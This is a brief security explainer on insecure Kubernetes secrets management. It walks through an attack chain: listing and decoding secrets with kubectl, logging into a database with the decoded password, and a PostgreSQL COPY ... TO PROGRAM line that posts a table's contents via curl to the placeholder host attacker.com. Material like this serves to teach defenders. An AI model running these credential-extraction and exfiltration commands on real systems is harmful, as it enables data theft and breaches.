# Insecure Secrets Management

Insecure secrets management in Kubernetes can lead to the exposure of sensitive data, such as API keys, database credentials, and certificates. Storing secrets in plaintext or using insecure backends increases the risk of unauthorized access by attackers.

---

## Exploitation Steps: Accessing Insecurely Stored Secrets

An attacker can identify Kubernetes Secrets stored in plaintext using the following command:

```bash
kubectl get secrets -o yaml
```

### 1. Decode a Kubernetes Secret

The attacker extracts and decodes a Base64-encoded secret:

```bash
kubectl get secret db-secret -o go-template='{{.data.password|base64decode}}'
```

### 2. Access Sensitive Services Using Exposed Credentials

The attacker uses the decoded credentials to access a database:

```bash
psql -h <database-ip> -U admin -W
```

### 3. Exfiltrate Data from the Database

The attacker exports sensitive data from the database to an external server:

```sql
COPY (SELECT * FROM sensitive_data) TO PROGRAM 'curl -X POST -d @- http://attacker.com/upload';
```

### Result

The attacker can access and exfiltrate sensitive data, potentially causing data breaches and regulatory compliance violations.
